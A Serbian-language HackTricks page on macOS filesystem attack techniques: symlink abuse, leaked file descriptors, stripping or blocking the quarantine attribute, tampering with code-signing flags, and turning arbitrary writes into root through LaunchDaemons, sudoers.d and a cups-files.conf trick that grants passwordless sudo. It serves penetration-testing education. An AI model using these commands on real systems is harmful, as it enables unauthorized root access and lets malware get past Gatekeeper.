# macOS FS trikovi

{{#include ../../../../banners/hacktricks-training.md}}

## Kombinacije POSIX dozvola

Dozvole u **direktorijumu**:

- **read** - možete **enumerate** unose direktorijuma
- **write** - možete **delete/write** **files** u direktorijumu i možete **delete empty folders**.
- Ali ne možete **delete/modify non-empty folders** osim ako imate write dozvole nad njima.
- Ne možete menjati naziv foldera osim ako ste njegov vlasnik.
- **execute** - dozvoljeno vam je **traverse** direktorijuma - ako nemate ovo pravo, ne možete pristupiti nijednom fajlu unutar njega niti u bilo kom poddirektorijumu.

### Opasne kombinacije

**Kako prepisati fajl/folder čiji je vlasnik root**, ali:

- Vlasnik jednog **parent directory**-ja u putanji je korisnik
- Vlasnik jednog **parent directory**-ja u putanji je **users group** sa **write access**
- **users group** ima **write** access nad **file**-om

Kod bilo koje od prethodnih kombinacija, napadač bi mogao da **inject**-uje **sym/hard link** na očekivanu putanju kako bi dobio privilegovani proizvoljni write.

### Folder root R+X specijalan slučaj

Ako u **directory**-ju postoje fajlovi kojima samo root ima R+X access, oni **nisu dostupni** nikome drugom. Zato bi ranjivost koja omogućava da se fajl koji korisnik može da pročita, ali koji ne može da pročita zbog ovog **ograničenja**, premesti iz ovog foldera **u drugi**, mogla biti zloupotrebljena za čitanje tih fajlova.

Primer na: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Permissive file/folder

Ako privilegovani proces upisuje podatke u **file** koji može da **kontroliše** korisnik sa **nižim privilegijama**, ili koji je korisnik sa nižim privilegijama mogao **prethodno da kreira**. Korisnik bi jednostavno mogao da ga **usmeri na drugi fajl** putem Symbolic ili Hard link-a, pa bi privilegovani proces upisivao u taj fajl.

Pogledajte druge odeljke u kojima napadač može da **zloupotrebi proizvoljni write za eskalaciju privilegija**.

### Open `O_NOFOLLOW`

Prema [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Proverava se samo **poslednja** komponenta — svaka **srednja** komponenta se i dalje razrešava i prati. Zato developer koji je "zaštitio" write pomoću `O_NOFOLLOW` i dalje može biti napadnut postavljanjem symlink-a u bilo koji **parent directory** ciljne putanje.

Ista man stranica dokumentuje flag-ove koji zaista uklanjaju ovaj propust:

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

U suprotnom, `openat()` relativan u odnosu na directory FD koji je prethodno validiran, ili `realpath()` + ponovna validacija, preostali su načini da se zaustave symlink zamene u sredini putanje.

## .fileloc

Fajlovi sa ekstenzijom **`.fileloc`** mogu upućivati na druge aplikacije ili binarne fajlove, pa će se pri njihovom otvaranju izvršiti ta aplikacija/binarni fajl.\
Primer:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Deskriptori datoteka

### Leak FD (bez `O_CLOEXEC`)

Ako poziv `open` nema zastavicu `O_CLOEXEC`, deskriptor datoteke će biti nasleđen od strane podređenog procesa. Dakle, ako privilegovani proces otvori privilegovanu datoteku i izvrši proces kojim upravlja napadač, napadač će **naslediti FD za privilegovanu datoteku**.

Kanonski primer je **`DYLD_PRINT_TO_FILE` LPE u OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):

- `dyld` je poštovao `DYLD_PRINT_TO_FILE=/path` čak i u **restricted (suid root) binarnim datotekama**, zato što je ta konkretna promenljiva parsirana izvan funkcije `processDyldEnvironmentVariable()`.
- Izvršavao je `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, pa je tako **kreirao datoteku u vlasništvu root korisnika na proizvoljnoj putanji**.
- FD **nikada nije bio zatvoren i nije imao close-on-exec zastavicu**, pa je svaki podređeni proces suid binarne datoteke nasleđivao **FD za upis u datoteku u vlasništvu root korisnika**.
- Pokretanje, na primer, `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, a zatim čitanje broja nasleđenog FD-a u podređenom procesu, omogućavalo je proizvoljan upis u datoteke u vlasništvu root korisnika; `fcntl(fd, F_SETFL, 0)` je čak uklanjao `O_APPEND`, čime je omogućeno prepisivanje umesto dodavanja.

Isti obrazac se pojavljuje kad god privilegovani proces otvori datoteku **pre** nego što izvrši nešto čime upravljate putem `exec`-a (helper tools, editore u stilu `crontab`-a pokrenute preko `$EDITOR`, log/debug datoteke otvorene iz putanje promenljive okruženja...). Nabrojte FD-ove koje ste nasledili pomoću:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Sve iznad `2` što ukazuje na datoteku koju ne možete sami da otvorite predstavlja primitive za proizvoljan upis (ili proizvoljno čitanje).

## Izbegavajte trikove sa quarantine xattrs

### Uklonite ga
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Ako datoteka/fascikla ima ovaj nepromenljivi atribut, na nju neće biti moguće postaviti xattr
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Sistemi datoteka bez podrške za xattr

Ne čuvaju svi sistemi datoteka koje macOS može da montira **proširene atribute** nativno. HFS+ i APFS ih podržavaju; **FAT32, exFAT i (većina) NFS mount-ova ih ne podržava** — macOS ih emulira upisivanjem prateće **AppleDouble** datoteke pod nazivom `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).

To je važno za quarantine, jer xattr opstaje samo ako se zaista može upisati **i ponovo pročitati** sa istog volumena:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Ako se tom volumenu kasnije pristupi preko putanje koja ignoriše prateću datoteku `._` (ili se prateća datoteka ukloni/obriše), datoteka stiže **bez quarantine zastavice** — a `.app` bez quarantine oznake dovoljan je za izlazak iz App Sandbox-a, kao što je opisano u [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Ovaj ACL sprečava dodavanje `xattrs` datoteci
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Format datoteke **AppleDouble** kopira datoteku zajedno sa njenim ACE-ovima.

U [**izvornom kodu**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) moguće je videti da će tekstualna reprezentacija ACL-a, sačuvana unutar xattr-a pod nazivom **`com.apple.acl.text`**, biti postavljena kao ACL u dekompresovanoj datoteci. Dakle, ako ste aplikaciju kompresovali u zip datoteku koristeći format datoteke **AppleDouble**, sa ACL-om koji sprečava upisivanje drugih xattr-ova u nju... quarantine xattr nije postavljen u aplikaciju:

Pogledajte [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) za više informacija.

Da bismo ovo replicirali, prvo moramo dobiti ispravan acl string:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Napomena: čak i ako ovo funkcioniše, sandbox prethodno upisuje quarantine xattr)

Nije zaista potrebno, ali ostavljam ovde za svaki slučaj:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Zaobilaženje provera potpisa

### Zaobilaženje provera platform binaries

Neke bezbednosne provere proveravaju da li je binary **platform binary**, na primer da bi dozvolile povezivanje sa XPC servisom. Međutim, kao što je prikazano u tekstu o zaobilaženju na adresi https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, ovu proveru je moguće zaobići tako što se preuzme platform binary (kao što je /bin/ls) i exploit ubaci preko dyld-a korišćenjem env promenljive `DYLD_INSERT_LIBRARIES`.

### Zaobilaženje zastavica `CS_REQUIRE_LV` i `CS_FORCED_LV`

Moguće je da executing binary izmeni sopstvene zastavice kako bi zaobišao provere, korišćenjem koda kao što je:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Zaobilaženje Code Signatures

Bundles sadrži fajl **`_CodeSignature/CodeResources`** koji sadrži **hash** svake pojedinačne **datoteke** u okviru **bundle-a**. Imajte na umu da je hash fajla CodeResources takođe **ugrađen u izvršnu datoteku**, tako da ni njega ne možemo menjati.

Međutim, postoje fajlovi čiji se signature neće proveravati; oni imaju ključ `omit` u plist-u, na primer:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Potpis resursa moguće je izračunati iz komandne linije pomoću:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montiranje dmgs

Korisnik može da montira kreirani prilagođeni dmg čak i preko nekih postojećih fascikli. Ovako možete da kreirate prilagođeni dmg paket sa prilagođenim sadržajem:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Obično macOS montira disk komunicirajući sa Mach servisom `com.apple.DiskArbitrarion.diskarbitrariond` (koji obezbeđuje `/usr/libexec/diskarbitrationd`). Ako se parametar `-d` doda u LaunchDaemons plist fajl i servis ponovo pokrene, logovi će se čuvati u `/var/log/diskarbitrationd.log`.\
Međutim, moguće je koristiti alate kao što su `hdik` i `hdiutil` za direktnu komunikaciju sa kext-om `com.apple.driver.DiskImages`.

## Proizvoljni upisi

### Periodic sh skripte

Ako vaša skripta može da se interpretira kao **shell script**, možete prepisati **`/etc/periodic/daily/999.local`** shell script, koji će se pokretati svakog dana.

Možete **simulirati** izvršavanje ove skripte pomoću: **`sudo periodic daily`**

### Daemons

Upišite proizvoljni **LaunchDaemon**, kao što je **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, sa plist fajlom koji izvršava proizvoljnu skriptu, kao što je:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.

### Sudoers fajl

If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.

### PATH fajlovi

The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.

You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.

### cups-files.conf

This technique was used in [this writeup](https://www.kandji.io/blog/macos-audit-story-part1).

Create the file `/etc/cups/cups-files.conf` with the following content:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Ovo će kreirati datoteku `/etc/sudoers.d/lpe` sa dozvolama 777. Dodatni sadržaj na kraju služi za pokretanje kreiranja error log-a.

Zatim, upišite u `/etc/sudoers.d/lpe` potrebnu konfiguraciju za eskalaciju privilegija, kao što je `%staff ALL=(ALL) NOPASSWD:ALL`.

Zatim ponovo izmenite datoteku `/etc/cups/cups-files.conf`, navodeći `LogFilePerm 700`, kako bi nova sudoers datoteka postala validna pozivanjem `cupsctl`.

### Escape iz sandbox-a

Moguće je izaći iz macOS sandbox-a pomoću FS arbitrary write. Za neke primere pogledajte stranicu [macOS Auto Start](../../../../macos-auto-start-locations.md), ali čest primer je upisivanje Terminal preferences datoteke u `~/Library/Preferences/com.apple.Terminal.plist`, koja izvršava komandu pri pokretanju, i njeno pozivanje pomoću `open`.

## Kreiranje datoteka sa mogućnošću upisivanja kao drugi korisnici

Veoma čest privesc primitive jeste da **privileged process kreira datoteku za vas** u direktorijumu kojim upravljate, a zatim zadržavanje **write access** nad tom datotekom. Potrebna su dva elementa:

1. Direktorijum čiji ste vlasnik (ili u kojem možete postaviti **inheritable ACL**), tako da sve što se u njemu kreira nasleđuje vaše dozvole.
2. Privileged/`suid` process kojem se može zadati **gde** da kreira datoteku — obično putem debug/logging environment variable-a, configuration file-a ili XPC API-ja helper-a.

Deo koji se odnosi na **inheritable ACL** omogućava da datoteka koju kreira process bude writable za vas, iako je u vlasništvu drugog korisnika. Zastavice nasleđivanja `file_inherit` / `directory_inherit` dokumentovane su u [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Sada je svaki fajl koji privilegovani proces kreira unutar `$DIRNAME` **upisiv za vas**. Ako je taj direktorijum takođe lokacija koja se kasnije **izvršava kao root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, direktorijum LaunchDaemon...), ovo predstavlja direktnu eskalaciju privilegija na root. Pogledajte odeljke [Sudoers File](#sudoers-file) i [cups-files.conf](#cups-filesconf) iznad da biste videli šta treba upisati kada dobijete fajl.

Za kompletan praktičan primer lanca „env promenljiva navodi root proces da kreira fajl, a FD procuri do vas“, pogledajte [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) iznad.

## POSIX deljena memorija

**POSIX deljena memorija** omogućava procesima u POSIX-kompatibilnim operativnim sistemima da pristupaju zajedničkoj memorijskoj oblasti, čime se omogućava brža komunikacija u poređenju sa drugim metodama međuprocesne komunikacije. Ona podrazumeva kreiranje ili otvaranje objekta deljene memorije pomoću `shm_open()`, podešavanje njegove veličine pomoću `ftruncate()` i mapiranje u adresni prostor procesa korišćenjem `mmap()`. Procesi zatim mogu direktno da čitaju iz ove memorijske oblasti i upisuju u nju. Za upravljanje istovremenim pristupom i sprečavanje oštećenja podataka često se koriste mehanizmi za sinhronizaciju, kao što su mutex-i ili semafori. Na kraju, procesi odmapiraju i zatvaraju deljenu memoriju pomoću `munmap()` i `close()`, a opciono uklanjaju objekat memorije pomoću `shm_unlink()`. Ovaj sistem je naročito efikasan za brzi IPC u okruženjima u kojima više procesa mora brzo da pristupa deljenim podacima.

<details>

<summary>Primer koda Producer-a</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Primer koda potrošača</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** su bezbednosna funkcija uvedena u macOS radi poboljšanja bezbednosti i pouzdanosti **file descriptor operations** u korisničkim aplikacijama. Ovi guarded descriptors pružaju način da se sa file descriptorima povežu određena ograničenja ili „guardovi“, koje kernel primenjuje.

Ova funkcija je naročito korisna za sprečavanje određenih klasa security vulnerabilities, kao što su **unauthorized file access** ili **race conditions**. Do ovih vulnerabilities dolazi, na primer, kada jedna nit pristupa file description-u, čime **drugoj ranjivoj niti daje pristup**, ili kada ranjivi child process **nasledi file descriptor**. Neke funkcije povezane sa ovom funkcionalnošću su:

- `guarded_open_np`: Otvara FD sa guard-om
- `guarded_close_np`: Zatvara ga
- `change_fdguard_np`: Menja guard flags na descriptor-u (čak i uklanja guard protection)

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (ACL inheritance flags)
- [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
